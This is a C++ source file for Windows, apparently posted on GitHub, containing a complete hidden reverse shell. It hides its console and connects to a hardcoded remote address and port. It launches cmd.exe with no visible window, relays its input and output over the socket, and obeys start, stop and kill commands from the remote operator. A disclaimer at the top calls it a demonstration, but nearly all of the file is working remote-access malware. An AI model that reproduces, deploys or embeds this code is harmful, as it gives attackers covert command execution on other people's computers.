/*
Coded by Stressedd, published to GitHub.
Please, dont skid the code or try to use it for malicious purposes.
This is just a demonstration of a common attack used by malware devs.
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <thread>
#include <iostream>
#include <ShObjIdl.h>

#pragma comment(lib,"ws2_32.lib")

using namespace std;

SOCKET sock;
HANDLE pipeInWrite;

const char* ipaddr = "192.168.1.35"; 
static int port = 6666; 

bool Isconnected = false;
bool Isactive = false;

static DWORD WINAPI HandlePipeOut(LPVOID lpParam) {
	char buffer[4096];
	DWORD bytesRead = 0;
	while (Isconnected) {
		if (Isactive) {
			memset(buffer, 0, sizeof(buffer));
			PeekNamedPipe(pipeInWrite, NULL, NULL, NULL, &bytesRead, NULL);
			if (bytesRead) {
				if (!ReadFile(pipeInWrite, buffer, sizeof(buffer), &bytesRead, NULL)) {

				}
				else {
					send(sock, buffer, bytesRead, 0);
				}
			}
		}
		Sleep(1);
	}
	return 1;
}

int main(char* argv, int argc) {
	FreeConsole();
	SECURITY_ATTRIBUTES securityAttributes;
	securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.lpSecurityDescriptor = NULL;

	HANDLE pipeOutRead, pipeInRead, pipeOutWrite;
	CreatePipe(&pipeInWrite, &pipeInRead, &securityAttributes, 0);
	CreatePipe(&pipeOutWrite, &pipeOutRead, &securityAttributes, 0);

	STARTUPINFOA startupInfo = { 0 };
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdInput = pipeOutWrite;
	startupInfo.hStdOutput = pipeInRead;
	startupInfo.hStdError = pipeInRead;

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return 0;
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct hostent* host;
	host = gethostbyname(ipaddr);

	SOCKADDR_IN sockAddr;
	sockAddr.sin_port = htons(port);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = *((unsigned long*)host->h_addr);

	if (connect(sock, (SOCKADDR*)(&sockAddr), sizeof(sockAddr)) != 0) {
		return 0;
	}

	Isconnected = true;

	PROCESS_INFORMATION processInfo = { 0 };
	char cmdPath[300];
	GetEnvironmentVariableA("ComSpec", cmdPath, sizeof(cmdPath));
	CreateProcessA(NULL, cmdPath, &securityAttributes, &securityAttributes, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);

	DWORD dwThreadReceiveID;
	CreateThread(NULL, 0, HandlePipeOut, 0, 0, &dwThreadReceiveID);

	while (Isconnected) {
		int bufferLength = 4096;
		char buffer[4096];
		int iResult;

		iResult = recv(sock, buffer, bufferLength, 0);

		if (iResult > 0) {
			std::string cmd = string(buffer, buffer + iResult);
			if (Isactive && cmd[0] == '0') {
				cmd = cmd.substr(1);
				DWORD bytesWrote;
				WriteFile(pipeOutRead, cmd.c_str(), strlen(cmd.c_str()), &bytesWrote, NULL);
			}
			else {
				cmd = cmd.substr(1);
				if (cmd == "start") {
					Isactive = true;
				}
				else if (cmd == "stop") {
					Isactive = false;
				}
				else if (cmd == "kill") {
					Isactive = false;
					Isconnected = false;
				}
			}
		}
		else {
			Isconnected = false;
			Isactive = false;
		}

		Sleep(1);
	}

	while (!TerminateProcess(processInfo.hProcess, 0)) {
		Sleep(1000);
	}

	closesocket(sock);
	WSACleanup();

	return 0;
}